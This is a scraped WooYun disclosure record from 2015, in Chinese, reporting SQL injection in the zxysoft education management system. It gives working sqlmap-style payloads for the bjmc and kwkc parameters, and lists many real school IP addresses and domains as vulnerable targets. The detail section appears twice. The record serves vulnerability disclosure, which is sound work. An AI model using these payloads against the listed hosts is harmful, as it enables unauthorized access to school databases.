{"id": 33978, "wybug_id": "wooyun-2015-0107560", "wybug_title": "zxysoft教育管理系统通用漏洞", "wybug_corp": "安徽中鑫云信息科技公司", "wybug_author": "路人甲", "wybug_date": "2015-04-20 12:23", "wybug_open_date": "2015-07-23 09:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-23：\t细节向公众公开  简要描述： 一堆问题 详细说明：  http://www.zxysoft.com/在官方演示站点都可以复现。注入点#1：http://61.190.9.90/webkbgl/xsbjkb.asp?bjmc=11%BF%B5%B8%B42在查询课表中，bjmc=存在注入Place: GETParameter: bjmc    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: bjmc=11%BF%B5%B8%B42' AND 2757=2757 AND 'EAmE'='EAmE    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: bjmc=11%BF%B5%B8%B42' AND 4494=CONVERT(INT,(CHAR(58)+CHAR(102)+CHAR(114)+CHAR(121)+CHAR(58)+(SELECT (CASE WHEN (4494=4494) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(105)+CHAR(112)+CHAR(115)+CHAR(58))) AND 'PvRa'='PvRa    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: bjmc=11%BF%B5%B8%B42'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: bjmc=11%BF%B5%B8%B42' WAITFOR DELAY '0:0:5'-----Database: ReportServerTempDB[9 tables]\n\n给出一些案例http://61.190.9.90/webkbgl/xsbjkb.asp?bjmc=11%BF%B5%B8%B42 http://218.22.37.5/webkbgl/xsbjkb.asp?bjmc=12%B8%DF%D6%B03 http://61.190.13.56/webkbgl/xsbjkb.asp?bjmc=11%B8%DF%D6%B0%B9%A4%D4%EC01http://218.22.50.19/webkbgl/xsbjkb.asp?bjmc=12%B5%E7%D7%D3%D0%C5%CF%A2%B9%A4%B3%CC1http://220.178.75.155/webksbm/default.asphttp://61.190.12.151:3880/webkbgl/xsbjkb.asp?bjmc=10-47 http://zyk.ahjsxx.cn/webkbgl/xsbjkb.asp?bjmc=11%BB%E1%BC%C6%D6%D0%D7%A8http://jwgl.ahjsxy.cn/webkbgl/xsbjkb.asp?bjmc=11%BB%E1%BC%C6%D6%D0%D7%A8http://220.165.147.248:8000/xsbjkb.asp?bjmc=271http://lhub.cn:9000/webkbgl/xsbjkb.asp?bjmc=%E5%8A%A8%E6%BC%AB141http://jxgl.ahiib.com/webkbgl/xsbjkb.asp?bjmc=%B1%A8%B9%D8131http://61.190.17.182/webkbgl/xsbjkb.asp?bjmc=13%B2%E8%D2%D5/webkbgl/http://61.190.13.56/webkbgl/xsbjkb.asp?bjmc=11%B8%DF%D6%B0%B9%A4%D4%EC02http://218.23.109.102/webkbgl/xsbjkb.asp?bjmc=13%B2%C6%B9%DC1http://218.23.105.20:90/webkbgl/xsbjkb.asp?bjmc=%B2%E2%C1%BF1309http://218.22.26.105/webkbgl/xsbjkb.asp?bjmc=13%B7%A8%C2%C901http://218.22.191.26:9200/#2：此处注入在考试安排中：http://60.166.58.70:8080/webkbgl/kwxskc.asp?kwkc=2kwkc=参数存在注入：\n\n案例》》》 http://60.166.58.70:8080/webkbgl/kwxskc.asp?kwkc=2 http://61.190.12.151:3880/webkbgl/kwxskc.asp?kwkc=1http://zyk.ahjsxx.cn/webkbgl/kwbkkc.asp?kwkc=1http://jwgl.ahjsxy.cn/webkbgl/kwbkkc.asp?kwkc=1http://lhub.cn:9000/webkbgl/kwbkkc.asp?kwkc=4www.hftyxy.com/cjgl/webkbgl/kwbkkc.asp?kwkc=3http://jxgl.ahiib.com/webkbgl/kwbkkc.asp?kwkc=1http://61.190.13.56/webkbgl/kwxskc.asp?kwkc=1http://218.23.109.102/webkbgl/kwbkkc.asp?kwkc=1http://218.23.105.20:90/webkbgl/kwxskc.asp?kwkc=1   漏洞证明：  http://www.zxysoft.com/在官方演示站点都可以复现。注入点#1：http://61.190.9.90/webkbgl/xsbjkb.asp?bjmc=11%BF%B5%B8%B42在查询课表中，bjmc=存在注入Place: GETParameter: bjmc    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: bjmc=11%BF%B5%B8%B42' AND 2757=2757 AND 'EAmE'='EAmE    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: bjmc=11%BF%B5%B8%B42' AND 4494=CONVERT(INT,(CHAR(58)+CHAR(102)+CHAR(114)+CHAR(121)+CHAR(58)+(SELECT (CASE WHEN (4494=4494) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(105)+CHAR(112)+CHAR(115)+CHAR(58))) AND 'PvRa'='PvRa    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: bjmc=11%BF%B5%B8%B42'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: bjmc=11%BF%B5%B8%B42' WAITFOR DELAY '0:0:5'-----Database: ReportServerTempDB[9 tables]\n\n给出一些案例http://61.190.9.90/webkbgl/xsbjkb.asp?bjmc=11%BF%B5%B8%B42 http://218.22.37.5/webkbgl/xsbjkb.asp?bjmc=12%B8%DF%D6%B03 http://61.190.13.56/webkbgl/xsbjkb.asp?bjmc=11%B8%DF%D6%B0%B9%A4%D4%EC01http://218.22.50.19/webkbgl/xsbjkb.asp?bjmc=12%B5%E7%D7%D3%D0%C5%CF%A2%B9%A4%B3%CC1http://220.178.75.155/webksbm/default.asphttp://61.190.12.151:3880/webkbgl/xsbjkb.asp?bjmc=10-47 http://zyk.ahjsxx.cn/webkbgl/xsbjkb.asp?bjmc=11%BB%E1%BC%C6%D6%D0%D7%A8http://jwgl.ahjsxy.cn/webkbgl/xsbjkb.asp?bjmc=11%BB%E1%BC%C6%D6%D0%D7%A8http://220.165.147.248:8000/xsbjkb.asp?bjmc=271http://lhub.cn:9000/webkbgl/xsbjkb.asp?bjmc=%E5%8A%A8%E6%BC%AB141http://jxgl.ahiib.com/webkbgl/xsbjkb.asp?bjmc=%B1%A8%B9%D8131http://61.190.17.182/webkbgl/xsbjkb.asp?bjmc=13%B2%E8%D2%D5/webkbgl/http://61.190.13.56/webkbgl/xsbjkb.asp?bjmc=11%B8%DF%D6%B0%B9%A4%D4%EC02http://218.23.109.102/webkbgl/xsbjkb.asp?bjmc=13%B2%C6%B9%DC1http://218.23.105.20:90/webkbgl/xsbjkb.asp?bjmc=%B2%E2%C1%BF1309http://218.22.26.105/webkbgl/xsbjkb.asp?bjmc=13%B7%A8%C2%C901http://218.22.191.26:9200/#2：此处注入在考试安排中：http://60.166.58.70:8080/webkbgl/kwxskc.asp?kwkc=2kwkc=参数存在注入：\n\n案例》》》 http://60.166.58.70:8080/webkbgl/kwxskc.asp?kwkc=2 http://61.190.12.151:3880/webkbgl/kwxskc.asp?kwkc=1http://zyk.ahjsxx.cn/webkbgl/kwbkkc.asp?kwkc=1http://jwgl.ahjsxy.cn/webkbgl/kwbkkc.asp?kwkc=1http://lhub.cn:9000/webkbgl/kwbkkc.asp?kwkc=4www.hftyxy.com/cjgl/webkbgl/kwbkkc.asp?kwkc=3http://jxgl.ahiib.com/webkbgl/kwbkkc.asp?kwkc=1http://61.190.13.56/webkbgl/kwxskc.asp?kwkc=1http://218.23.109.102/webkbgl/kwbkkc.asp?kwkc=1http://218.23.105.20:90/webkbgl/kwxskc.asp?kwkc=1   修复方案：  过滤咯   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2015-04-24 09:44 厂商回复： CNVD未复现所述情况，已经由CNVD通过网站公开联系方式向软件生产厂商及赛尔教育通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}